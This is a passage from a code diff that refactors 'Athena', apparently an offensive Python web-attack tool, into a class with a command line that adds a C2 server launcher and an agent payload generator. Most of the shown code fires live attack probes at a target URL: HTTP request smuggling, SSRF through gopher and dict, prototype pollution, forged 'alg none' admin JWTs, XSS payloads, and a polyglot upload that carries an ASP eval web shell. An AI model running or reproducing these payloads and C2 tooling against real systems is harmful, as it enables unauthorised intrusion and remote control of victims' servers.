-    qs = "&".join(f"{p}=1&{p}=2" for p in tgt["params"])
-    full = f"{u}?{qs}"
-    try:
-        r = requests.get(full, headers=h(), timeout=TIMEOUT)
-        if "1" in r.text and "2" in r.text:
-            log("HPP", u, qs)
-    except: pass
+    def test_pollution(self, tgt):
+        polys = [
+            {"__proto__":{"polluted":True}},
+            {"constructor":{"prototype":{"polluted":"yes"}}},
+            {"__proto__.toString":"hacked"}
+        ]
+        for p in polys:
+            for method, hdr in [("json",{"Content-Type":"application/json"}),("form",{"Content-Type":"application/x-www-form-urlencoded"})]:
+                try:
+                    r = requests.post(tgt["url"],
+                                      json=p if method=="json" else None,
+                                      data=None if method=="json" else p,
+                                      headers=hdr, timeout=TIMEOUT, verify=False)
+                    if any(x in r.text for x in ("polluted","hacked")):
+                        self.log("PrototypePollution", tgt["url"], method)
+                        return
+                except Exception as e:
+                    if self.args.debug:
+                        logging.debug(f"[pollute:{method}] {e}")
 
-def test_smuggle(tgt):
-    host = urllib.parse.urlparse(tgt["url"]).netloc
-    variants = [
-        f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length:4\r\nTransfer-Encoding:chunked\r\n\r\n0\r\n\r\nSMG",
-        f"POST / HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding:chunked\r\nContent-Length:4\r\n\r\n0\r\n\r\nSMG"
-    ]
-    for v in variants:
+    async def test_ws(self, u, method, params):
+        for ep in params:
+            uri = ep if ep.startswith(("ws://","wss://")) else u.replace("http://","ws://").replace("https://","wss://")
+            try:
+                async with websockets.connect(uri) as ws:
+                    await ws.send("ping")
+                    pong = await ws.recv()
+                    if pong:
+                        self.log("WebSocket", uri, f"pong←{pong}")
+                        return
+            except Exception as e:
+                if self.args.debug:
+                    logging.debug(f"[ws] {e}")
+
+    async def test_sse(self, u, method, params):
+        for ep in params:
+            uri = ep if ep.startswith(("http://","https://")) else u
+            try:
+                async with aiohttp.ClientSession() as sess:
+                    async with sess.get(uri, timeout=TIMEOUT) as resp:
+                        async for raw in resp.content:
+                            if raw.strip().startswith(b"data:"):
+                                self.log("SSE", uri, raw.strip().decode(errors="ignore"))
+                                return
+            except Exception as e:
+                if self.args.debug:
+                    logging.debug(f"[sse] {e}")
+
+    def test_graphql(self, tgt):
+        query = {"query":"query IntrospectionQuery { __schema { types { name } } }"}
+        try:
+            r = requests.post(tgt["url"], json=query, headers=self.h(), timeout=TIMEOUT, verify=False)
+            if "__schema" in r.text:
+                self.log("GraphQL-Introspection", tgt["url"], "POST")
+                return
+        except Exception as e:
+            if self.args.debug:
+                logging.debug(f"[graphql:post] {e}")
+        try:
+            r = requests.get(tgt["url"], params={"query":query["query"]}, timeout=TIMEOUT, verify=False)
+            if "__schema" in r.text:
+                self.log("GraphQL-Introspection", tgt["url"], "GET")
+        except:
+            pass
+
+    def test_graphql_mutation(self, tgt):
+        mutation = {"query":"mutation { __typename }"}
+        try:
+            r = requests.post(tgt["url"], json=mutation, headers=self.h(), timeout=TIMEOUT, verify=False)
+            if r.status_code == 200:
+                self.log("GraphQL-Mutation", tgt["url"], "__typename")
+        except Exception as e:
+            if self.args.debug:
+                logging.debug(f"[gmut] {e}")
+
+    def test_upload_polyglot(self, tgt):
+        boundaries = [
+            "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters, k=16)),
+            "----FormBoundary" + ''.join(random.choices(string.ascii_letters, k=12))
+        ]
+        poly = b"\xFF\xD8\xFF" + b"\x50\x4B\x03\x04" + b"<% eval(request('pwn')) %>"
+        for boundary in boundaries:
+            for field in ("file","upload","data"):
+                files = {field:("cyz.jpg", poly, "application/octet-stream")}
+                hdr = {"Content-Type":f"multipart/form-data; boundary={boundary}"}
+                try:
+                    r = requests.post(tgt["url"], files=files, headers=hdr, timeout=TIMEOUT, verify=False)
+                    if r.status_code in (200,201) and "cyz" in r.text.lower():
+                        self.log("PolyglotUpload", tgt["url"], f"{field}@{boundary}")
+                        return
+                except Exception as e:
+                    if self.args.debug:
+                        logging.debug(f"[upload:{field}] {e}")
+
+    def test_wasm(self, tgt):
+        wasm = b"\x00asm\x01\x00\x00\x00" + b"\x01\x0A\x02\x60\x00\x01\x7F\x60\x01\x7F\x00"
+        for ctype in ("application/wasm","application/octet-stream"):
+            try:
+                hdr = self.h(); hdr["Content-Type"]=ctype
+                r = requests.post(tgt["url"], data=wasm, headers=hdr, timeout=TIMEOUT, verify=False)
+                if any(x in r.text.lower() for x in ("error","memory")):
+                    self.log("WASM", tgt["url"], ctype)
+                    return
+            except Exception as e:
+                if self.args.debug:
+                    logging.debug(f"[wasm:{ctype}] {e}")
+
+    def test_ai_xss(self, tgt):
+        if not Scanner.USE_AI:
+            return
+        base = "<script>alert('CYZ')</script>"
+        muts = self.ai_mutate(base, n=3)
+        for p in muts:
+            try:
+                data = {k:p for k in tgt["params"]}
+                r = requests.post(tgt["url"], data=data, headers=self.h(), timeout=TIMEOUT, verify=False)
+                if p in r.text:
+                    self.log("AI-XSS", tgt["url"], p)
+                    return
+            except Exception as e:
+                if self.args.debug:
+                    logging.debug(f"[ai-xss] {e}")
+
+    def test_ssrf(self, tgt):
+        for param in tgt["params"]:
+            for proto in ("http","gopher","dict"):
+                payload = f"{proto}://127.0.0.1"
+                try:
+                    r = requests.get(tgt["url"], params={param:payload}, headers=self.h(), timeout=TIMEOUT, verify=False)
+                    if r.status_code < 500:
+                        self.log("SSRF", tgt["url"], f"{param}={payload}")
+                        return
+                except:
+                    pass
+
+    def test_hpp(self, tgt):
+        u = tgt["url"]
+        qs = "&".join(f"{p}=1&{p}=2" for p in tgt["params"])
+        full = f"{u}?{qs}"
+        try:
+            r = requests.get(full, headers=self.h(), timeout=TIMEOUT, verify=False)
+            if "1" in r.text and "2" in r.text:
+                self.log("HPP", u, qs)
+        except:
+            pass
+
+    def test_smuggle(self, tgt):
+        host = urllib.parse.urlparse(tgt["url"]).netloc
+        variants = [
+            f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length:4\r\nTransfer-Encoding:chunked\r\n\r\n0\r\n\r\nSMG",
+            f"POST / HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding:chunked\r\nContent-Length:4\r\n\r\n0\r\n\r\nSMG"
+        ]
+        for v in variants:
+            try:
+                s = requests.Session()
+                req = requests.Request('POST', tgt["url"]).prepare()
+                req.body = v.encode()
+                r = s.send(req, timeout=TIMEOUT, verify=False)
+                if "SMG" in r.text:
+                    self.log("Smuggle", tgt["url"], "variant")
+                    return
+            except:
+                pass
+
+    def test_http2(self, tgt):
+        self.log("HTTP2-SMUGGLE", tgt["url"], "skipped (HTTP/2 client req)")
+
+    def test_trailer(self, tgt):
         try:
             s = requests.Session()
-            req = requests.Request('POST', tgt["url"]).prepare(); req.body = v.encode()
-            r = s.send(req, timeout=TIMEOUT)
-            if "SMG" in r.text:
-                log("Smuggle", tgt["url"], "variant"); return
-        except: pass
+            prep = requests.Request('POST', tgt["url"]).prepare()
+            prep.headers['Transfer-Encoding'] = 'chunked'
+            prep.body = b"0\r\nFlavor: CHEESE\r\n\r\n"
+            r = s.send(prep, timeout=TIMEOUT, verify=False)
+            if r.headers.get('Flavor') == 'CHEESE':
+                self.log("Trailer", tgt["url"], "Flavor trailer")
+        except:
+            pass
 
-def test_http2(tgt):
-    log("HTTP2-SMUGGLE", tgt["url"], "skipped (HTTP/2 client req)")
-
-def test_trailer(tgt):
-    try:
-        s = requests.Session()
-        prep = requests.Request('POST', tgt["url"]).prepare()
-        prep.headers['Transfer-Encoding'] = 'chunked'
-        prep.body = b"0\r\nFlavor: CHEESE\r\n\r\n"
-        r = s.send(prep, timeout=TIMEOUT)
-        if r.headers.get('Flavor') == 'CHEESE':
-            log("Trailer", tgt["url"], "Flavor trailer")
-    except: pass
-
-def test_csp(tgt):
-    try:
-        r = requests.get(tgt["url"], headers=h(), timeout=TIMEOUT)
-        csp = r.headers.get("Content-Security-Policy", "")
-        if "script-src" in csp:
-            payload = "<script src=//example.com/x.js></script>"
-            r2 = requests.get(f"{tgt['url']}?x={urllib.parse.quote(payload)}", headers=h(), timeout=TIMEOUT)
-            if payload in r2.text:
-                log("CSP-Bypass", tgt["url"], csp)
-    except: pass
-
-def test_cors(tgt):
-    try:
-        hdr = h(); hdr["Origin"] = "https://evil.com"
-        r = requests.options(tgt["url"], headers=hdr, timeout=TIMEOUT)
-        if r.headers.get("Access-Control-Allow-Origin") == "*":
-            log("CORS", tgt["url"], "*")
-    except: pass
-
-def test_sw(tgt):
-    url = urllib.parse.urljoin(tgt["url"], "/sw.js")
-    try:
-        r = requests.get(url, headers=h(), timeout=TIMEOUT)
-        if "importScripts" in r.text:
-            log("ServiceWorker", url, "importScripts found")
-    except: pass
-
-def test_jwt(tgt):
-    header = base64.urlsafe_b64encode(b'{"alg":"none"}').decode().strip('=')
-    payload = base64.urlsafe_b64encode(b'{"sub":"admin"}').decode().strip('=')
-    token = f"{header}.{payload}."
-    try:
-        r = requests.get(tgt["url"], headers={**h(), "Authorization": f"Bearer {token}"}, timeout=TIMEOUT)
-        if r.status_code == 200:
-            log("JWT-None", tgt["url"], token)
-    except: pass
-
-def test_spa(tgt):
-    for p in tgt["params"]:
-        payload = "\"/\"+alert(1)"
+    def test_csp(self, tgt):
         try:
-            r = requests.get(f"{tgt['url']}#/{p}={urllib.parse.quote(payload)}", headers=h(), timeout=TIMEOUT)
-            if payload in r.text:
-                log("SPA-XSS", tgt["url"], payload); return
-        except: pass
+            r = requests.get(tgt["url"], headers=self.h(), timeout=TIMEOUT, verify=False)
+            csp = r.headers.get("Content-Security-Policy","")
+            if "script-src" in csp:
+                payload = "<script src=//example.com/x.js></script>"
+                r2 = requests.get(f"{tgt['url']}?x={urllib.parse.quote(payload)}",
+                                  headers=self.h(), timeout=TIMEOUT, verify=False)
+                if payload in r2.text:
+                    self.log("CSP-Bypass", tgt["url"], csp)
+        except:
+            pass
 
-# ─── DISPATCH & MAIN ────────────────────────────────────────────────────────
-def dispatch(tgt):
-    if args.all or args.xxe:     test_xxe(tgt)
-    if args.all or args.deser:   test_deserialization(tgt)
-    if args.all or args.pollute: test_pollution(tgt)
-    if args.all or args.smuggle: test_smuggle(tgt)
-    if args.all or args.http2:   test_http2(tgt)
-    if args.all or args.trailer: test_trailer(tgt)
-    if args.all or args.hpp:     test_hpp(tgt)
-    if args.all or args.ssrf:    test_ssrf(tgt)
-    if args.all or args.graphql: test_graphql(tgt)
-    if args.all or args.gmut:    test_graphql_mutation(tgt)
-    if args.all or args.upload:  test_upload_polyglot(tgt)
-    if args.all or args.wasm:    test_wasm(tgt)
-    if args.all or args.csp:     test_csp(tgt)
-    if args.all or args.cors:    test_cors(tgt)
-    if args.all or args.sw:      test_sw(tgt)
-    if args.all or args.jwt:     test_jwt(tgt)
-    if args.all or args.spa:     test_spa(tgt)
-    if args.ai:                  test_ai_xss(tgt)
+    def test_cors(self, tgt):
+        try:
+            hdr = self.h(); hdr["Origin"] = "https://evil.com"
+            r = requests.options(tgt["url"], headers=hdr, timeout=TIMEOUT, verify=False)
+            if r.headers.get("Access-Control-Allow-Origin") == "*":
+                self.log("CORS", tgt["url"], "*")
+        except:
+            pass
 
-async def main_async():
-    if not LOGFILE.exists(): LOGFILE.write_text(f"# Red-X Report {VERSION}\n\n")
-    root = smart(args.url.rstrip("/"))
-    extra = load_routes(root)
-    if args.sync:
-        results, seen = crawl_sync(root, args.max_pages, extra)
-    else:
-        results, seen = await crawl_async(root, args.max_pages, extra)
-    if args.jsparse:
-        js = parse_js(root, seen)
-        for u in js:
-            results.append({"url": u, "method": "GET", "params": ["q"]})
-    logging.info(f"[+] {len(results)} endpoints discovered")
-    # handle WS/SSE
-    if args.ws or args.sse:
-        tasks = []
-        for u,m,ps in results:
-            if args.ws: tasks.append(test_ws(u,m,ps))
-            if args.sse: tasks.append(test_sse(u,m,ps))
-        await asyncio.gather(*tasks)
-    # sync dispatch
-    with ThreadPoolExecutor(max_workers=args.threads) as pool:
-        pool.map(dispatch, results)
+    def test_sw(self, tgt):
+        url = urllib.parse.urljoin(tgt["url"], "/sw.js")
+        try:
+            r = requests.get(url, headers=self.h(), timeout=TIMEOUT, verify=False)
+            if "importScripts" in r.text:
+                self.log("ServiceWorker", url, "importScripts found")
+        except:
+            pass
+
+    def test_jwt(self, tgt):
+        header = base64.urlsafe_b64encode(b'{"alg":"none"}').decode().strip('=')
+        payload = base64.urlsafe_b64encode(b'{"sub":"admin"}').decode().strip('=')
+        token = f"{header}.{payload}."
+        try:
+            r = requests.get(tgt["url"], headers={**self.h(), "Authorization":f"Bearer {token}"},
+                             timeout=TIMEOUT, verify=False)
+            if r.status_code == 200:
+                self.log("JWT-None", tgt["url"], token)
+        except:
+            pass
+
+    def test_spa(self, tgt):
+        for p in tgt["params"]:
+            payload = "\"/\"+alert(1)"
+            try:
+                r = requests.get(f"{tgt['url']}#/{p}={urllib.parse.quote(payload)}",
+                                 headers=self.h(), timeout=TIMEOUT, verify=False)
+                if payload in r.text:
+                    self.log("SPA-XSS", tgt["url"], payload)
+                    return
+            except:
+                pass
+
+    def dispatch(self, tgt):
+        if self.args.all     or self.args.xxe:     self.test_xxe(tgt)
+        if self.args.all     or self.args.deser:   self.test_deserialization(tgt)
+        if self.args.all     or self.args.pollute: self.test_pollution(tgt)
+        if self.args.all     or self.args.smuggle: self.test_smuggle(tgt)
+        if self.args.all     or self.args.http2:   self.test_http2(tgt)
+        if self.args.all     or self.args.trailer: self.test_trailer(tgt)
+        if self.args.all     or self.args.hpp:     self.test_hpp(tgt)
+        if self.args.all     or self.args.ssrf:    self.test_ssrf(tgt)
+        if self.args.all     or self.args.graphql: self.test_graphql(tgt)
+        if self.args.all     or self.args.gmut:    self.test_graphql_mutation(tgt)
+        if self.args.all     or self.args.upload:  self.test_upload_polyglot(tgt)
+        if self.args.all     or self.args.wasm:    self.test_wasm(tgt)
+        if self.args.all     or self.args.csp:     self.test_csp(tgt)
+        if self.args.all     or self.args.cors:    self.test_cors(tgt)
+        if self.args.all     or self.args.sw:      self.test_sw(tgt)
+        if self.args.all     or self.args.jwt:     self.test_jwt(tgt)
+        if self.args.all     or self.args.spa:     self.test_spa(tgt)
+        if self.args.ai:                              self.test_ai_xss(tgt)
+
+    async def run(self):
+        root = self.smart(self.args.url.rstrip("/"))
+        extra = self.load_routes(root)
+        if self.args.sync:
+            results, seen = self.crawl_sync(root, self.args.max_pages, extra)
+        else:
+            results, seen = await self.crawl_async(root, self.args.max_pages, extra)
+        if self.args.jsparse:
+            js = self.parse_js(root, seen)
+            for u in js:
+                results.append({"url":u,"method":"GET","params":["q"]})
+        logging.info(f"[+] {len(results)} endpoints discovered")
+        # WS/SSE
+        if self.args.ws or self.args.sse:
+            tasks=[]
+            for u,m,ps in results:
+                if self.args.ws:  tasks.append(self.test_ws(u,m,ps))
+                if self.args.sse: tasks.append(self.test_sse(u,m,ps))
+            await asyncio.gather(*tasks)
+        # sync dispatch
+        with ThreadPoolExecutor(max_workers=self.args.threads) as pool:
+            pool.map(self.dispatch, results)
+
+# =============================================================================
+# CLI & Main
+# =============================================================================
+def build_cli():
+    p = argparse.ArgumentParser(prog="athena")
+    sub = p.add_subparsers(dest="mode", required=True)
+
+    # Scan
+    scan = sub.add_parser("scan", help="Run web vulnerability scanner")
+    scan.add_argument("-u","--url", required=True)
+    scan.add_argument("--all", action="store_true")
+    scan.add_argument("--xxe", action="store_true")
+    scan.add_argument("--deser", action="store_true")
+    scan.add_argument("--pollute", action="store_true")
+    scan.add_argument("--smuggle", action="store_true")
+    scan.add_argument("--http2", action="store_true")
+    scan.add_argument("--trailer", action="store_true")
+    scan.add_argument("--hpp", action="store_true")
+    scan.add_argument("--ssrf", action="store_true")
+    scan.add_argument("--graphql", action="store_true")
+    scan.add_argument("--gmut", action="store_true")
+    scan.add_argument("--upload", action="store_true")
+    scan.add_argument("--wasm", action="store_true")
+    scan.add_argument("--ws", action="store_true")
+    scan.add_argument("--sse", action="store_true")
+    scan.add_argument("--csp", action="store_true")
+    scan.add_argument("--cors", action="store_true")
+    scan.add_argument("--sw", action="store_true")
+    scan.add_argument("--jwt", action="store_true")
+    scan.add_argument("--spa", action="store_true")
+    scan.add_argument("--ai", action="store_true")
+    scan.add_argument("--render", action="store_true")
+    scan.add_argument("--jsparse", action="store_true")
+    scan.add_argument("--routes")
+    scan.add_argument("--threads", type=int, default=14)
+    scan.add_argument("--max-pages", type=int, default=120)
+    scan.add_argument("--dnslog-off", dest="dnslog", action="store_false")
+    scan.add_argument("--debug", action="store_true")
+    scan.add_argument("--sync", action="store_true")
+
+    # Serve
+    srv = sub.add_parser("serve", help="Launch C2 server")
+    srv.add_argument("--bind", default="0.0.0.0")
+    srv.add_argument("--port", type=int, default=DEFAULT_PORT)
+    srv.add_argument("--rsa-key")
+    srv.add_argument("--debug", action="store_true")
+
+    # Payload
+    pay = sub.add_parser("payload", help="Generate agent payload")
+    pay.add_argument("--type", choices=["python-stager","exe"], default="python-stager")
+    pay.add_argument("--output", required=True)
+    pay.add_argument("--server", required=True)
+    pay.add_argument("--port", type=int, default=DEFAULT_PORT)
+
+    return p
+
+def main():
+    cli = build_cli()
+    args = cli.parse_args()
+    setup_logging(getattr(args,"debug",False))
+
+    if args.mode == "scan":
+        logging.info(f"[SCAN] Athena v{VERSION} scanning {args.url}")
+        scn = Scanner(args)
+        asyncio.run(scn.run())
+
+    elif args.mode == "serve":
+        logging.info(f"[C2] Athena C2 v{VERSION} starting …")
+        srv = C2Server(bind=args.bind, port=args.port, rsa_key_path=args.rsa_key)
+        srv.start()
+        try:
+            while True:
+                time.sleep(1)
+        except KeyboardInterrupt:
+            logging.info("[C2] Shutdown")
+
+    elif args.mode == "payload":
+        AgentBuilder(args.server, args.port).write(args.type, args.output)
+        logging.info(f"[PAYLOAD] {args.type} written to {args.output}")
 
 if __name__ == "__main__":
-    asyncio.run(main_async()) if not args.sync else asyncio.run(main_async())
+    main()
